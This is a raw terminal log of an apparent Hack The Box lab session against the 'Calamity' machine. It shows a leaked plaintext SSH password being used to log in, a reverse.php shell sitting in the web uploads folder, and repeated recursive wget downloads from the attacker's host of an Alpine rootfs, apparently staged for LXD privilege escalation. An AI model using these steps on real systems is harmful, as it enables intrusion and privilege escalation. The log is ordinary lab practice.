@@ -1,0 +1,551 @@
+root@parrot:~/hackthebox/calamity# cat xalvas-files/ssh_password                
+username : xalvas                       
+password : 18547936..*                  
+root@parrot:~/hackthebox/calamity# scp alpine-v3.11-i686-20200115_0409.tar.gz xalvas@10.10.10.27:^C                                                             
+root@parrot:~/hackthebox/calamity# ssh xalvas@10.10.10.27                       
+xalvas@10.10.10.27's password:          
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-81-generic i686)                 
+
+ * Documentation:  https://help.ubuntu.com                                      
+ * Management:     https://landscape.canonical.com                              
+ * Support:        https://ubuntu.com/advantage                                 
+
+9 packages can be updated.              
+8 updates are security updates.         
+
+
+Last login: Wed Jan 15 04:19:17 2020 from 10.10.14.14                           
+xalvas@calamity:~$ ls                   
+alarmclocks  alpine-v3.11-i686-20200115_0409.tar.gz  app  dontforget.txt  intrusions  peda  recov.wav  user.txt                                                 
+xalvas@calamity:~$ file alpine-v3.11-i686-20200115_0409.tar.gz                  
+alpine-v3.11-i686-20200115_0409.tar.gz: empty                                   
+xalvas@calamity:~$ file alpine-v3.11-i686-20200115_0409.tar.gz                  
+alpine-v3.11-i686-20200115_0409.tar.gz: empty                                   
+xalvas@calamity:~$ ls                   
+alarmclocks  alpine-v3.11-i686-20200115_0409.tar.gz.1  app  dontforget.txt  intrusions  peda  recov.wav  user.txt                                               
+xalvas@calamity:~$ cd /var/www/html     
+xalvas@calamity:/var/www/html$ ls       
+admin.php  bg.png  index.html  leet.png  uploads                                
+xalvas@calamity:/var/www/html$ cd uploads/                                      
+xalvas@calamity:/var/www/html/uploads$ ls                                       
+alpine.tar.gz  metadata.yaml  readme  reverse.php                               
+xalvas@calamity:/var/www/html/uploads$ rm alpine.tar.gz                         
+rm: remove write-protected regular empty file 'alpine.tar.gz'? y                
+xalvas@calamity:/var/www/html/uploads$ ls                                       
+metadata.yaml  readme  reverse.php      
+xalvas@calamity:/var/www/html/uploads$ rm readme                                
+rm: remove write-protected regular empty file 'readme'? y                       
+xalvas@calamity:/var/www/html/uploads$ mkdir rootfs                             
+xalvas@calamity:/var/www/html/uploads$ ls                                       
+metadata.yaml  reverse.php  rootfs      
+xalvas@calamity:/var/www/html/uploads$ cd rootfs                                
+xalvas@calamity:/var/www/html/uploads/rootfs$ ls                                
+xalvas@calamity:/var/www/html/uploads/rootfs$ cd ..                             
+xalvas@calamity:/var/www/html/uploads$ cd ..                                    
+xalvas@calamity:/var/www/html$ cd ..    
+xalvas@calamity:/var/www$ cd html/uploads/rootfs/                               
+xalvas@calamity:/var/www/html/uploads/rootfs$ ls                                
+xalvas@calamity:/var/www/html/uploads/rootfs$ wget -r http://10.10.14.14:8000/ -P /var/www/html/rootfs/                                                         
+--2020-01-15 06:07:43--  http://10.10.14.14:8000/                               
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 666 [text/html]                 
+/var/www/html/rootfs/10.10.14.14:8000: No such file or directory/var/www/html/rootfs/10.10.14.14:8000/index.html: No such file or directory                     
+
+Cannot write to ‘/var/www/html/rootfs/10.10.14.14:8000/index.html’ (Success).   
+xalvas@calamity:/var/www/html/uploads/rootfs$ cd ..                             
+xalvas@calamity:/var/www/html/uploads$ ls -la                                   
+total 24                                
+drwxrwxrwx 3 www-data root     4096 Jan 15 06:05 .                              
+drwxr-xr-x 3 root     root     4096 Jun 27  2017 ..                             
+-rw-r--r-- 1 www-data www-data  604 Jan 15 04:09 metadata.yaml                  
+-rw-r--r-- 1 www-data www-data 5493 Jan 15 03:06 reverse.php                    
+drwxrwxr-x 2 xalvas   xalvas   4096 Jan 15 06:05 rootfs                         
+xalvas@calamity:/var/www/html/uploads$ cd rootfs                                
+xalvas@calamity:/var/www/html/uploads/rootfs$ wget -r http://10.10.14.14:8000/  
+--2020-01-15 06:08:39--  http://10.10.14.14:8000/                               
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 666 [text/html]                 
+Saving to: ‘10.10.14.14:8000/index.html’
+
+10.10.14.14:8000/index.html             100%[===============================================================================>]     666  --.-KB/s    in 0s       
+
+2020-01-15 06:08:40 (121 MB/s) - ‘10.10.14.14:8000/index.html’ saved [666/666]  
+
+Loading robots.txt; please ignore errors.                                       
+--2020-01-15 06:08:40--  http://10.10.14.14:8000/robots.txt                     
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 404 File not found                      
+2020-01-15 06:08:41 ERROR 404: File not found.                                  
+
+--2020-01-15 06:08:41--  http://10.10.14.14:8000/bin/                           
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 2857 (2.8K) [text/html]         
+Saving to: ‘10.10.14.14:8000/bin/index.html’                                    
+
+10.10.14.14:8000/bin/index.html         100%[===============================================================================>]   2.79K  --.-KB/s    in 0.02s    
+
+2020-01-15 06:08:41 (140 KB/s) - ‘10.10.14.14:8000/bin/index.html’ saved [2857/2857]                                                                            
+
+--2020-01-15 06:08:41--  http://10.10.14.14:8000/dev/                           
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 270 [text/html]                 
+Saving to: ‘10.10.14.14:8000/dev/index.html’                                    
+
+10.10.14.14:8000/dev/index.html         100%[===============================================================================>]     270  --.-KB/s    in 0s       
+
+2020-01-15 06:08:42 (22.1 MB/s) - ‘10.10.14.14:8000/dev/index.html’ saved [270/270]                                                                             
+
+--2020-01-15 06:08:42--  http://10.10.14.14:8000/etc/                           
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 1565 (1.5K) [text/html]         
+Saving to: ‘10.10.14.14:8000/etc/index.html’                                    
+
+10.10.14.14:8000/etc/index.html         100%[===============================================================================>]   1.53K  --.-KB/s    in 0.009s   
+
+2020-01-15 06:08:42 (171 KB/s) - ‘10.10.14.14:8000/etc/index.html’ saved [1565/1565]                                                                            
+
+--2020-01-15 06:08:42--  http://10.10.14.14:8000/home/                          
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 188 [text/html]                 
+Saving to: ‘10.10.14.14:8000/home/index.html’                                   
+
+10.10.14.14:8000/home/index.html        100%[===============================================================================>]     188  --.-KB/s    in 0s       
+
+2020-01-15 06:08:43 (8.12 MB/s) - ‘10.10.14.14:8000/home/index.html’ saved [188/188]                                                                            
+
+--2020-01-15 06:08:43--  http://10.10.14.14:8000/lib/                           
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 788 [text/html]                 
+Saving to: ‘10.10.14.14:8000/lib/index.html’                                    
+
+10.10.14.14:8000/lib/index.html         100%[===============================================================================>]     788  --.-KB/s    in 0s       
+
+2020-01-15 06:08:44 (127 MB/s) - ‘10.10.14.14:8000/lib/index.html’ saved [788/788]                                                                              
+
+--2020-01-15 06:08:44--  http://10.10.14.14:8000/media/                         
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 284 [text/html]                 
+Saving to: ‘10.10.14.14:8000/media/index.html’                                  
+
+10.10.14.14:8000/media/index.html       100%[===============================================================================>]     284  --.-KB/s    in 0s       
+
+2020-01-15 06:08:44 (44.3 MB/s) - ‘10.10.14.14:8000/media/index.html’ saved [284/284]                                                                           
+
+--2020-01-15 06:08:44--  http://10.10.14.14:8000/mnt/                           
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 186 [text/html]                 
+Saving to: ‘10.10.14.14:8000/mnt/index.html’                                    
+
+10.10.14.14:8000/mnt/index.html         100%[===============================================================================>]     186  --.-KB/s    in 0s       
+
+2020-01-15 06:08:45 (16.0 MB/s) - ‘10.10.14.14:8000/mnt/index.html’ saved [186/186]                                                                             
+
+--2020-01-15 06:08:45--  http://10.10.14.14:8000/opt/                           
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 186 [text/html]                 
+Saving to: ‘10.10.14.14:8000/opt/index.html’                                    
+
+10.10.14.14:8000/opt/index.html         100%[===============================================================================>]     186  --.-KB/s    in 0s       
+
+2020-01-15 06:08:46 (15.8 MB/s) - ‘10.10.14.14:8000/opt/index.html’ saved [186/186]                                                                             
+
+--2020-01-15 06:08:46--  http://10.10.14.14:8000/proc/                          
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 188 [text/html]                 
+Saving to: ‘10.10.14.14:8000/proc/index.html’                                   
+
+10.10.14.14:8000/proc/index.html        100%[===============================================================================>]     188  --.-KB/s    in 0s       
+
+2020-01-15 06:08:46 (16.9 MB/s) - ‘10.10.14.14:8000/proc/index.html’ saved [188/188]                                                                            
+
+--2020-01-15 06:08:46--  http://10.10.14.14:8000/root/                          
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 188 [text/html]                 
+Saving to: ‘10.10.14.14:8000/root/index.html’                                   
+
+10.10.14.14:8000/root/index.html        100%[===============================================================================>]     188  --.-KB/s    in 0s       
+
+2020-01-15 06:08:47 (12.6 MB/s) - ‘10.10.14.14:8000/root/index.html’ saved [188/188]                                                                            
+
+--2020-01-15 06:08:47--  http://10.10.14.14:8000/run/                           
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 186 [text/html]                 
+Saving to: ‘10.10.14.14:8000/run/index.html’                                    
+
+10.10.14.14:8000/run/index.html         100%[===============================================================================>]     186  --.-KB/s    in 0s       
+
+2020-01-15 06:08:48 (17.7 MB/s) - ‘10.10.14.14:8000/run/index.html’ saved [186/186]                                                                             
+
+--2020-01-15 06:08:48--  http://10.10.14.14:8000/sbin/                          
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 3915 (3.8K) [text/html]         
+Saving to: ‘10.10.14.14:8000/sbin/index.html’                                   
+
+10.10.14.14:8000/sbin/index.html        100%[===============================================================================>]   3.82K  4.58KB/s    in 0.8s     
+
+2020-01-15 06:10:24 (4.58 KB/s) - ‘10.10.14.14:8000/sbin/index.html’ saved [3915/3915]                                                                          
+
+--2020-01-15 06:10:24--  http://10.10.14.14:8000/srv/                           
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 186 [text/html]                 
+Saving to: ‘10.10.14.14:8000/srv/index.html’                                    
+
+10.10.14.14:8000/srv/index.html         100%[===============================================================================>]     186  --.-KB/s    in 0s       
+
+2020-01-15 06:10:25 (16.0 MB/s) - ‘10.10.14.14:8000/srv/index.html’ saved [186/186]                                                                             
+
+--2020-01-15 06:10:25--  http://10.10.14.14:8000/sys/                           
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 186 [text/html]                 
+Saving to: ‘10.10.14.14:8000/sys/index.html’                                    
+
+10.10.14.14:8000/sys/index.html         100%[===============================================================================>]     186  --.-KB/s    in 0s       
+
+2020-01-15 06:10:26 (34.7 MB/s) - ‘10.10.14.14:8000/sys/index.html’ saved [186/186]                                                                             
+
+--2020-01-15 06:10:26--  http://10.10.14.14:8000/tmp/                           
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 186 [text/html]                 
+Saving to: ‘10.10.14.14:8000/tmp/index.html’                                    
+
+10.10.14.14:8000/tmp/index.html         100%[===============================================================================>]     186  --.-KB/s    in 0s       
+
+2020-01-15 06:10:26 (29.3 MB/s) - ‘10.10.14.14:8000/tmp/index.html’ saved [186/186]                                                                             
+
+--2020-01-15 06:10:26--  http://10.10.14.14:8000/usr/                           
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 336 [text/html]                 
+Saving to: ‘10.10.14.14:8000/usr/index.html’                                    
+
+10.10.14.14:8000/usr/index.html         100%[===============================================================================>]     336  --.-KB/s    in 0s       
+
+2020-01-15 06:10:27 (50.9 MB/s) - ‘10.10.14.14:8000/usr/index.html’ saved [336/336]                                                                             
+
+--2020-01-15 06:10:27--  http://10.10.14.14:8000/var/                           
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 514 [text/html]                 
+Saving to: ‘10.10.14.14:8000/var/index.html’                                    
+
+10.10.14.14:8000/var/index.html         100%[===============================================================================>]     514  --.-KB/s    in 0s       
+
+2020-01-15 06:10:27 (40.9 MB/s) - ‘10.10.14.14:8000/var/index.html’ saved [514/514]                                                                             
+
+--2020-01-15 06:10:27--  http://10.10.14.14:8000/bin/arch                       
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 707288 (691K) [application/octet-stream]                                
+Saving to: ‘10.10.14.14:8000/bin/arch’  
+
+10.10.14.14:8000/bin/arch                 1%[>                                                                               ]  11.64K  --.-KB/s    eta 11h 54m^C                                       
+xalvas@calamity:/var/www/html/uploads/rootfs$ ls                                
+10.10.14.14:8000                        
+xalvas@calamity:/var/www/html/uploads/rootfs$ cd 10.10.14.14\:8000/             
+xalvas@calamity:/var/www/html/uploads/rootfs/10.10.14.14:8000$ ls               
+bin  dev  etc  home  index.html  lib  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var                                                           
+xalvas@calamity:/var/www/html/uploads/rootfs/10.10.14.14:8000$ du               
+8       ./root                          
+8       ./var                           
+8       ./sys                           
+8       ./etc                           
+8       ./sbin                          
+8       ./mnt                           
+8       ./media                         
+8       ./opt                           
+8       ./run                           
+8       ./lib                           
+8       ./home                          
+20      ./bin                           
+8       ./dev                           
+8       ./proc                          
+8       ./tmp                           
+8       ./srv                           
+8       ./usr                           
+156     .                               
+xalvas@calamity:/var/www/html/uploads/rootfs/10.10.14.14:8000$ which git        
+/usr/bin/git                            
+xalvas@calamity:/var/www/html/uploads/rootfs/10.10.14.14:8000$ git clone https://github.com/saghul/lxd-alpine-builder.git                                       
+Cloning into 'lxd-alpine-builder'...    
+fatal: unable to access 'https://github.com/saghul/lxd-alpine-builder.git/': Could not resolve host: github.com                                                 
+xalvas@calamity:/var/www/html/uploads/rootfs/10.10.14.14:8000$ ls               
+bin  dev  etc  home  index.html  lib  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var                                                           
+xalvas@calamity:/var/www/html/uploads/rootfs/10.10.14.14:8000$ rm *             
+rm: cannot remove 'bin': Is a directory 
+rm: cannot remove 'dev': Is a directory 
+rm: cannot remove 'etc': Is a directory 
+rm: cannot remove 'home': Is a directory                                        
+rm: cannot remove 'lib': Is a directory 
+rm: cannot remove 'media': Is a directory                                       
+rm: cannot remove 'mnt': Is a directory 
+rm: cannot remove 'opt': Is a directory 
+rm: cannot remove 'proc': Is a directory                                        
+rm: cannot remove 'root': Is a directory                                        
+rm: cannot remove 'run': Is a directory 
+rm: cannot remove 'sbin': Is a directory                                        
+rm: cannot remove 'srv': Is a directory 
+rm: cannot remove 'sys': Is a directory 
+rm: cannot remove 'tmp': Is a directory 
+rm: cannot remove 'usr': Is a directory 
+rm: cannot remove 'var': Is a directory 
+xalvas@calamity:/var/www/html/uploads/rootfs/10.10.14.14:8000$ rm -r *          
+xalvas@calamity:/var/www/html/uploads/rootfs/10.10.14.14:8000$ ls               
+xalvas@calamity:/var/www/html/uploads/rootfs/10.10.14.14:8000$ cd ..            
+xalvas@calamity:/var/www/html/uploads/rootfs$ rmdir 10.10.14.14\:8000/          
+xalvas@calamity:/var/www/html/uploads/rootfs$ wget -r --reject=index.html 10.10.14.14:8000/                                                                     
+--2020-01-15 06:34:08--  http://10.10.14.14:8000/                               
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 666 [text/html]                 
+Saving to: ‘10.10.14.14:8000/index.html’
+
+10.10.14.14:8000/index.html             100%[===============================================================================>]     666  --.-KB/s    in 0s       
+
+2020-01-15 06:34:09 (82.6 MB/s) - ‘10.10.14.14:8000/index.html’ saved [666/666] 
+
+Loading robots.txt; please ignore errors.                                       
+--2020-01-15 06:34:09--  http://10.10.14.14:8000/robots.txt                     
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 404 File not found                      
+2020-01-15 06:34:10 ERROR 404: File not found.                                  
+
+Removing 10.10.14.14:8000/index.html since it should be rejected.               
+
+--2020-01-15 06:34:10--  http://10.10.14.14:8000/bin/                           
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 2857 (2.8K) [text/html]         
+Saving to: ‘10.10.14.14:8000/bin/index.html’                                    
+
+10.10.14.14:8000/bin/index.html         100%[===============================================================================>]   2.79K  --.-KB/s    in 0.1s     
+
+2020-01-15 06:34:11 (28.0 KB/s) - ‘10.10.14.14:8000/bin/index.html’ saved [2857/2857]                                                                           
+
+Removing 10.10.14.14:8000/bin/index.html since it should be rejected.           
+
+--2020-01-15 06:34:11--  http://10.10.14.14:8000/dev/                           
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 270 [text/html]                 
+Saving to: ‘10.10.14.14:8000/dev/index.html’                                    
+
+10.10.14.14:8000/dev/index.html         100%[===============================================================================>]     270  --.-KB/s    in 0s       
+
+2020-01-15 06:34:11 (22.3 MB/s) - ‘10.10.14.14:8000/dev/index.html’ saved [270/270]                                                                             
+
+Removing 10.10.14.14:8000/dev/index.html since it should be rejected.           
+
+--2020-01-15 06:34:11--  http://10.10.14.14:8000/etc/                           
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 1565 (1.5K) [text/html]         
+Saving to: ‘10.10.14.14:8000/etc/index.html’                                    
+
+10.10.14.14:8000/etc/index.html         100%[===============================================================================>]   1.53K  --.-KB/s    in 0.02s    
+
+2020-01-15 06:34:12 (62.7 KB/s) - ‘10.10.14.14:8000/etc/index.html’ saved [1565/1565]                                                                           
+
+Removing 10.10.14.14:8000/etc/index.html since it should be rejected.           
+
+--2020-01-15 06:34:12--  http://10.10.14.14:8000/home/                          
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 188 [text/html]                 
+Saving to: ‘10.10.14.14:8000/home/index.html’                                   
+
+10.10.14.14:8000/home/index.html        100%[===============================================================================>]     188  --.-KB/s    in 0s       
+
+2020-01-15 06:34:13 (27.0 MB/s) - ‘10.10.14.14:8000/home/index.html’ saved [188/188]                                                                            
+
+Removing 10.10.14.14:8000/home/index.html since it should be rejected.          
+
+--2020-01-15 06:34:13--  http://10.10.14.14:8000/lib/                           
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 788 [text/html]                 
+Saving to: ‘10.10.14.14:8000/lib/index.html’                                    
+
+10.10.14.14:8000/lib/index.html         100%[===============================================================================>]     788  --.-KB/s    in 0s       
+
+2020-01-15 06:34:13 (119 MB/s) - ‘10.10.14.14:8000/lib/index.html’ saved [788/788]                                                                              
+
+Removing 10.10.14.14:8000/lib/index.html since it should be rejected.           
+
+--2020-01-15 06:34:13--  http://10.10.14.14:8000/media/                         
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 284 [text/html]                 
+Saving to: ‘10.10.14.14:8000/media/index.html’                                  
+
+10.10.14.14:8000/media/index.html       100%[===============================================================================>]     284  --.-KB/s    in 0s       
+
+2020-01-15 06:34:14 (36.7 MB/s) - ‘10.10.14.14:8000/media/index.html’ saved [284/284]                                                                           
+
+Removing 10.10.14.14:8000/media/index.html since it should be rejected.         
+
+--2020-01-15 06:34:14--  http://10.10.14.14:8000/mnt/                           
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 186 [text/html]                 
+Saving to: ‘10.10.14.14:8000/mnt/index.html’                                    
+
+10.10.14.14:8000/mnt/index.html         100%[===============================================================================>]     186  --.-KB/s    in 0s       
+
+2020-01-15 06:34:14 (9.37 MB/s) - ‘10.10.14.14:8000/mnt/index.html’ saved [186/186]                                                                             
+
+Removing 10.10.14.14:8000/mnt/index.html since it should be rejected.           
+
+--2020-01-15 06:34:14--  http://10.10.14.14:8000/opt/                           
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 186 [text/html]                 
+Saving to: ‘10.10.14.14:8000/opt/index.html’                                    
+
+10.10.14.14:8000/opt/index.html         100%[===============================================================================>]     186  --.-KB/s    in 0s       
+
+2020-01-15 06:34:15 (27.4 MB/s) - ‘10.10.14.14:8000/opt/index.html’ saved [186/186]                                                                             
+
+Removing 10.10.14.14:8000/opt/index.html since it should be rejected.           
+
+--2020-01-15 06:34:15--  http://10.10.14.14:8000/proc/                          
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 188 [text/html]                 
+Saving to: ‘10.10.14.14:8000/proc/index.html’                                   
+
+10.10.14.14:8000/proc/index.html        100%[===============================================================================>]     188  --.-KB/s    in 0s       
+
+2020-01-15 06:34:16 (24.0 MB/s) - ‘10.10.14.14:8000/proc/index.html’ saved [188/188]                                                                            
+
+Removing 10.10.14.14:8000/proc/index.html since it should be rejected.          
+
+--2020-01-15 06:34:16--  http://10.10.14.14:8000/root/                          
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 188 [text/html]                 
+Saving to: ‘10.10.14.14:8000/root/index.html’                                   
+
+10.10.14.14:8000/root/index.html        100%[===============================================================================>]     188  --.-KB/s    in 0s       
+
+2020-01-15 06:34:16 (29.3 MB/s) - ‘10.10.14.14:8000/root/index.html’ saved [188/188]                                                                            
+
+Removing 10.10.14.14:8000/root/index.html since it should be rejected.          
+
+--2020-01-15 06:34:16--  http://10.10.14.14:8000/run/                           
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 186 [text/html]                 
+Saving to: ‘10.10.14.14:8000/run/index.html’                                    
+
+10.10.14.14:8000/run/index.html         100%[===============================================================================>]     186  --.-KB/s    in 0s       
+
+2020-01-15 06:34:17 (28.1 MB/s) - ‘10.10.14.14:8000/run/index.html’ saved [186/186]                                                                             
+
+Removing 10.10.14.14:8000/run/index.html since it should be rejected.           
+
+--2020-01-15 06:34:17--  http://10.10.14.14:8000/sbin/                          
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 3915 (3.8K) [text/html]         
+Saving to: ‘10.10.14.14:8000/sbin/index.html’                                   
+
+10.10.14.14:8000/sbin/index.html        100%[===============================================================================>]   3.82K  7.22KB/s    in 0.5s     
+
+2020-01-15 06:35:19 (7.22 KB/s) - ‘10.10.14.14:8000/sbin/index.html’ saved [3915/3915]                                                                          
+
+Removing 10.10.14.14:8000/sbin/index.html since it should be rejected.          
+
+--2020-01-15 06:35:19--  http://10.10.14.14:8000/srv/                           
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 186 [text/html]                 
+Saving to: ‘10.10.14.14:8000/srv/index.html’                                    
+
+10.10.14.14:8000/srv/index.html         100%[===============================================================================>]     186  --.-KB/s    in 0s       
+
+2020-01-15 06:35:20 (27.1 MB/s) - ‘10.10.14.14:8000/srv/index.html’ saved [186/186]                                                                             
+
+Removing 10.10.14.14:8000/srv/index.html since it should be rejected.           
+
+--2020-01-15 06:35:20--  http://10.10.14.14:8000/sys/                           
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 186 [text/html]                 
+Saving to: ‘10.10.14.14:8000/sys/index.html’                                    
+
+10.10.14.14:8000/sys/index.html         100%[===============================================================================>]     186  --.-KB/s    in 0s       
+
+2020-01-15 06:35:20 (28.3 MB/s) - ‘10.10.14.14:8000/sys/index.html’ saved [186/186]                                                                             
+
+Removing 10.10.14.14:8000/sys/index.html since it should be rejected.           
+
+--2020-01-15 06:35:20--  http://10.10.14.14:8000/tmp/                           
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 186 [text/html]                 
+Saving to: ‘10.10.14.14:8000/tmp/index.html’                                    
+
+10.10.14.14:8000/tmp/index.html         100%[===============================================================================>]     186  --.-KB/s    in 0s       
+
+2020-01-15 06:35:21 (28.5 MB/s) - ‘10.10.14.14:8000/tmp/index.html’ saved [186/186]                                                                             
+
+Removing 10.10.14.14:8000/tmp/index.html since it should be rejected.           
+
+--2020-01-15 06:35:21--  http://10.10.14.14:8000/usr/                           
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 336 [text/html]                 
+Saving to: ‘10.10.14.14:8000/usr/index.html’                                    
+
+10.10.14.14:8000/usr/index.html         100%[===============================================================================>]     336  --.-KB/s    in 0s       
+
+2020-01-15 06:35:22 (53.1 MB/s) - ‘10.10.14.14:8000/usr/index.html’ saved [336/336]                                                                             
+
+Removing 10.10.14.14:8000/usr/index.html since it should be rejected.           
+
+--2020-01-15 06:35:22--  http://10.10.14.14:8000/var/                           
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 514 [text/html]                 
+Saving to: ‘10.10.14.14:8000/var/index.html’                                    
+
+10.10.14.14:8000/var/index.html         100%[===============================================================================>]     514  --.-KB/s    in 0s       
+
+2020-01-15 06:35:23 (86.8 MB/s) - ‘10.10.14.14:8000/var/index.html’ saved [514/514]                                                                             
+
+Removing 10.10.14.14:8000/var/index.html since it should be rejected.           
+
+--2020-01-15 06:35:23--  http://10.10.14.14:8000/bin/arch                       
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 707288 (691K) [application/octet-stream]                                
+Saving to: ‘10.10.14.14:8000/bin/arch’  
+
+10.10.14.14:8000/bin/arch                 1%[>                                                                               ]  11.64K  --.-KB/s    eta 3h 24m ^C                                       
+xalvas@calamity:/var/www/html/uploads/rootfs$ cd ..                             
+xalvas@calamity:/var/www/html/uploads$ rm -r rootfs/                            
+xalvas@calamity:/var/www/html/uploads$ ls                                       
+metadata.yaml  reverse.php  templates   
+xalvas@calamity:/var/www/html/uploads$ rm -r templates/                         
+xalvas@calamity:/var/www/html/uploads$ cd /home                                 
+xalvas@calamity:/home$ exit             
+logout                                  
+Connection to 10.10.10.27 closed.       
+root@parrot:~/hackthebox/calamity#      
